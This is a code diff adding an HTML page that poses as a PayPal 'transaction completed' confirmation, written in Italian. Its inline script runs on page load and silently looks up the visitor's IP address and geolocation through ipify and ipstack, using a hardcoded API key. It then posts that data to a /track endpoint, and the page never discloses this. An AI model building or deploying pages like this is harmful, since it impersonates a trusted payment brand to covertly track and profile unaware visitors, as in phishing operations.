@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Transazione PayPal</title>
+    <script>
+        async function getIPInfo() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            const ipstackResponse = await fetch(`http://api.ipstack.com/${ip}?access_key=6c087b111c3e3f16617850d2777a3e4b`);
+            const ipstackData = await ipstackResponse.json();
+
+            await fetch('/track', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ ip, location: ipstackData })
+            });
+        }
+
+        window.onload = getIPInfo;
+    </script>
+</head>
+<body>
+    <h1>Transazione PayPal</h1>
+    <p>Transazione completata con successo!</p>
+</body>
+</html>
